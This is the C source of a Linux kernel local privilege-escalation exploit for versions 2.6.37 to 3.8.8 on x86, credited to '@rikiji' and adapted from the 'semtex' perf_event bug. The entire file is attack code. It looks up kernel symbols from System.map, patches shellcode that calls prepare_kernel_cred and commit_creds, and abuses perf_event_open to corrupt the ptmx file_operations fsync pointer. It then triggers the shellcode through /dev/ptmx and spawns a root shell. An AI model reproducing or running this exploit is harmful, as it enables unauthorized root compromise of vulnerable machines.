/*
 * linux 2.6.37-3.8.8 - x86
 * @rikiji
 *
 * requires System.map and /dev/ptmx
 * this: http://zmbs.net/~rikiji/perf_ptmx.c
 * original: http://fucksheep.org/~sd/warez/semtex.c
 */

#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <stdint.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>

#define SYSMAP_PREFIX "/boot/System.map-"
#define PAGE_SIZE 4096

unsigned long commit_creds = 0;
unsigned long prepare_kernel_cred = 0;

#define OFFSET_PREP 3
#define OFFSET_COMM 10
char shellcode [] = "\x31\xc0\xbb\x04\x03\x02\x01\xff\xd3\xbb\x08\x07\x06\x05\xff\xd3\xc3";

unsigned long getsym(char * sym)
{
  char s[256] = { 0 };
  int fd = open("/proc/version", O_RDONLY);
  read(fd, s, sizeof(s));
  strtok(s, " ");
  strtok(NULL, " ");
  char * version = strtok(NULL, " ");
  close(fd);
  
  int len = strlen(version) + strlen(SYSMAP_PREFIX) + 1;
  char * mapf = malloc(len);
  memset(mapf, 0, len);
  strncpy(mapf, SYSMAP_PREFIX, strlen(SYSMAP_PREFIX));
  strncpy(mapf + strlen(SYSMAP_PREFIX), version, strlen(version));
  
  fd = open(mapf, O_RDONLY);
  
#define BUFSIZE 1024
  char * buf = malloc(BUFSIZE + 1);
  buf[BUFSIZE] = 0;
  int partial = 0, found = 0;
  char addr[9];
  
  while(!found) {
    read(fd, buf, BUFSIZE);    
    char * tok = strtok(buf," \n");
    
    while(tok != NULL) {
      int n = strlen(tok);
      if(partial) {
	if(strncmp(sym + partial, tok, n) == 0) {
	  found = 1;
	  break;
	} else {
	  partial = 0;	
	}
      } else {
	if(strncmp(sym, tok, n) == 0) {
	  strncpy(addr, tok - 11, 9);
	  if(n < strlen(sym) && (tok + n == buf + BUFSIZE)) {
	    partial = n;
	    break;	  
	  }
	  if(n == strlen(sym)) {
	    found = 1;
	    break;
	  }
	}
      }
      tok = strtok(NULL," \n");
    }
  }  
  close(fd);
  
  printf("%s: 0x%s\n", sym, addr);
  return strtoul(addr, NULL, 16);  
}

int main(int argc, char ** argv) 
{
  unsigned long perf_table = getsym("perf_swevent_enabled");
  commit_creds = getsym("commit_creds");
  prepare_kernel_cred = getsym("prepare_kernel_cred");
  unsigned long pmtx_ops = getsym("ptmx_fops");

  *((unsigned int *)(shellcode + OFFSET_PREP)) = prepare_kernel_cred;
  *((unsigned int *)(shellcode + OFFSET_COMM)) = commit_creds;

  int s;
  for(s=0;s<sizeof(shellcode);s++)
    printf("%02x ", (unsigned char)shellcode[s]);  
  printf("\n");

  /* 56 is offset of fsync in struct file_operations */
  int target = pmtx_ops + 56;
  int payload = -((perf_table - target)/4);
  printf("payload: 0x%x\n", payload);

  unsigned long base_addr = 0x10000;
  char * map = mmap((void *)base_addr, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_FIXED | MAP_SHARED, -1, 0);
    
  if(map == MAP_FAILED)
    perror("mmap");    
  
  memcpy(map, shellcode, 0x30);

  struct perf_event_attr event_attr;
  memset(&event_attr, 0, sizeof(struct perf_event_attr));
  event_attr.type = 1;
  event_attr.size = sizeof(struct perf_event_attr);  
  event_attr.config = payload;    

  int times = base_addr;
  int i = 0, k;

#define BLOCK 256
  while(times - i > 0) {
    printf("i %d\n", i);
    if(times - i > BLOCK) {
      if(fork()) {	
	for(k=0;k<BLOCK;k++){
	  int fd = syscall(__NR_perf_event_open, &event_attr, 0, -1, -1, 0);
	  if (fd < 0) {
	    perror("perf_event_open child");
	  }
	}
	pause();
	exit(0);
      }
      i += BLOCK;
    } else {      
      int fd = syscall(__NR_perf_event_open, &event_attr, 0, -1, -1, 0);
      if (fd < 0) {
	perror("perf_event_open");
	sleep(1);
      }
      i++;
    }    
  }

  int ptmx = open("/dev/ptmx", O_RDWR);
  fsync(ptmx);

  if(getuid()) {
    printf("failed");
    return -1;
  }

  printf("root!!");
  execl("/bin/sh", "sh", NULL);

  return 0;
}